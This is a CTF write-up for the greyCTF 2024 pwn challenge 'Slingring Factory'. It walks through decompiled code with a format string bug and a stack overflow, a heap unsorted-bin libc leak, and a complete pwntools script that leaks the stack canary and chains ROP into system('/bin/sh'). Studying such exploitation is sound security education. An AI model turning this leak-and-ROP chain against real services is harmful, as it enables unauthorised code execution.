---
title: Slingring Factory
date: 2024-04-23
tags: 
- pwn
- format string
- buffer overflow
- heap
- ret2libc
- rop
- author-hartmannsyg
categories: greyCTF 2024
---

written by {% person hartmannsyg %} (solved by {% person hartmannsyg %} and {% person fs %})

>In following Greycat's adventures, you have stumbled upon a factory that produces weirdly-shaped rings. Upon closer inspection, you realise that the rings seem very familiar -- they looked exactly like the Sling Rings you saw from the Marvel Comics universe! Having some time leftover, you decide to explore the factory. Alas, you eventually come to realise that these Sling Rings were in fact not the same as those you knew: during forging, their destinations have to already be set. You wonder what you could do with these rings...<br>
>Author: uhg
>`nc challs.nusgreyhats.org 35678`

This was like an Avengers:Endgame level of collab solve, mainly because there are like many puzzle pieces to put together.

> Actually now that I think about it, slingrings did show up in Avengers:Endgame

{% ccb terminal:true html:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/grey/slingring-factory</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> checksec slingring_factory
[</SPAN><SPAN STYLE="color:#61AFEF;">*</SPAN><SPAN STYLE="color:#DCDFE4;">] '/home/rwandi/ctf/grey/slingring-factory/slingring_factory'
    Arch:       amd64-64-little
    RELRO:      </SPAN><SPAN STYLE="color:#98C379;">Full RELRO
</SPAN><SPAN STYLE="color:#DCDFE4;">    Stack:      </SPAN><SPAN STYLE="color:#98C379;">Canary found
</SPAN><SPAN STYLE="color:#DCDFE4;">    NX:         </SPAN><SPAN STYLE="color:#98C379;">NX enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    PIE:        </SPAN><SPAN STYLE="color:#98C379;">PIE enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    SHSTK:      </SPAN><SPAN STYLE="color:#98C379;">Enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    IBT:        </SPAN><SPAN STYLE="color:#98C379;">Enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    Stripped:   </SPAN><SPAN STYLE="color:#E06C75;">No</SPAN>
{% endccb %}

We see that we basically have all security checks enabled, so the challenge won't be something trivial.

## Vulnerabities

Right off the bat, we have a format string vuln:

{% ccb lang:c highlight:13 gutter1:1-22 %}
undefined8 main(void)

{
  long in_FS_OFFSET;
  char name [6];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  puts("What is your name?");
  fgets(name,6,stdin);
  printf("Hello, ");
  printf(name);
  putchar(L'\n');
  fflush(stdin);
  menu();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
{% endccb %}

The program then calls `menu()`:

```c
void menu(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_14 [4];
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
LAB_001018e9:
  cls();
  puts("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
  puts("Welcome to my secret sling ring factory.");
  puts("What do you want to do today?\n");
  puts("1. Show Forged Rings");
  puts("2. Forge Sling Ring");
  puts("3. Discard Sling Ring");
  puts("4. Use Sling Ring");
  printf(">> ");
  fgets(local_14,4,stdin);
  fflush(stdin);
  putchar(10);
  iVar1 = atoi(local_14);
  if (iVar1 == 4) {
    use_slingring();
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (iVar1 < 5) {
    if (iVar1 == 3) {
      discard_slingring();
      goto LAB_001018e9;
    }
    if (iVar1 < 4) {
      if (iVar1 == 1) {
        show_slingrings();
      }
      else {
        if (iVar1 != 2) goto LAB_00101a05;
        forge_slingring();
      }
      goto LAB_001018e9;
    }
  }
LAB_00101a05:
  puts("Invalid input!");
  puts("Press ENTER to go back...");
  getchar();
  goto LAB_001018e9;
}
```

We are able to create (forge), read (show), *use* (???) and delete (discard) slingrings? Also this "CRUD functionality" just *reeks* of a heap challenge (oh no)

The `forge_slingring()`, `show_slingrings()` and `discard_slingring()` methods are about what we would expect (glorified `malloc(0x84)`, read, `free()`), except that `show_slingrings()` allow us to read the contents of discarded rings (i.e. freed chunks). 

This basically gives us a libc leak via unsorted bins. The crux of this exploit is that unsorted bins contain an address within libc when we can use to get the libc base. For us to create a freed chunk within an unsorted bin:

- Fill up tcache
    > Each bin contains a maximum of 7 same-size chunks ranging from 24 to 1032 bytes on 64-bit systems and 12 to 516 bytes on 32-bit systems.<br>
    > from https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/
    So we need to free() 7 other chunks before we can get an unsortedbin
- The chunk's size is big enough that it does not go into the fastbin
    Since a chunk size of 0x90, (0x84 gets rounded up to 0x90, or 144) is greater than the fastbin max size of 88, our freed bin will not be in the fastbin.
- Ensure there are no neighboring freed chunks in the small, large and unsorted bins
    When we fill up tcache, there are no other bins other than tcache bins, so we can create an unsorted bin
- Ensure that our chunk is not next to the top chunk
    If not, it will get merged with the top chunk. As long as there is a chunk between the freed bin and the top chunk, this will not happen.

(There are other checks involved but these are the more relevant ones)

Now let's look at the sus "use" functionality:

{% ccb lang:c gutter1:1-23 highlight:6,15 %}
void use_slingring(void)

{
  long in_FS_OFFSET;
  char ring [4];
  char spell [56];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("Which ring would you like to use (id): ");
  fgets(ring,4,stdin);
  fflush(stdin);
  atoi(ring);
  printf("\nPlease enter the spell: ");
  fgets(spell,0x100,stdin);
  puts("\nThank you for visiting our factory! We will now transport you.");
  puts("\nTransporting...");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endccb %}

We have a buffer overflow as we are reading 0x100 bytes into a buffer (`spell`) of size 56.

## Putting it all together

We have a format string vuln, but we have PIE and ASLR so we need a leak somewhere to use it for an arb write, and we can only use it once right at the very start. We have a libc leak, but only after our format string vuln. We have a buffer overflow, but there is canary protections. After a lot of thinking, we realized we could leak the canary from the format string vulnerability, so we made a game plan:

- leak canary with format string vulnerabitiy
    canaries are shared across all functions so the canary that was leaked in the `main()` function will be the same as the canary in `use_slingring()`
- leak libc by reading an unsorted bin
- ROP `system("/bin/sh")` with the buffer overflow in `use_slingring()`

{% ccb lang:py gutter1:1-2,S,15-69 %}
from pwn import *

//SKIP_LINE:(3-14 # Intialize process code) 

p.sendlineafter(b'What is your name?', '%27$p') # offset to canary is 27

p.recvuntil(b'Hello, ')
canary = p.recvline()
canary = int(canary, 16)
info(f'canary @ {hex(canary)}')

p.sendline() # idk why this is needed

def forge(slot, location, amount):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b'Which slot do you want to store it in? (0-9)', str(slot).encode())
    p.sendlineafter(b'Enter destination location:', location)
    p.sendlineafter(b'Enter amount of rings you want to forge (1-9):', str(amount).encode())
    p.sendlineafter(b'Press ENTER to return.', b'')

def discard(slot):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Which ring would you like to discard?", str(slot).encode())


for i in range(10):
    forge(i, b'a', 1)

for i in range(8):
    discard(i)

p.sendlineafter(b">> ", b"1")
p.recvuntil(b'Ring Slot #7  |')
line = p.recvline()
main_arena = line.split(b'| ')[1]
main_arena = u64(main_arena[:6]+b'\x00\x00')
info(hex(main_arena))
libc_base = main_arena - 0x21ace0
libc=elf.libc
libc.address=libc_base

info(f'libc base @ {hex(libc_base)}')

p.sendlineafter(b'Press ENTER to return.', b'')

binsh = libc.search(b"/bin/sh").__next__()
info(f'/bin/sh @ {hex(binsh)}')

rdi = libc_base + 0x000000000002a3e5
ret = libc_base + 0x0000000000029139

payload = b"A"*56 + p64(canary) + b"A"*8 + p64(rdi) + p64(binsh) + p64(ret) + p64(libc.sym['system'])

p.sendlineafter(b">> ", b"4")
p.sendlineafter(b"(id): ", b"0")
p.sendlineafter(b"spell: ", payload)

p.interactive()
{% endccb %}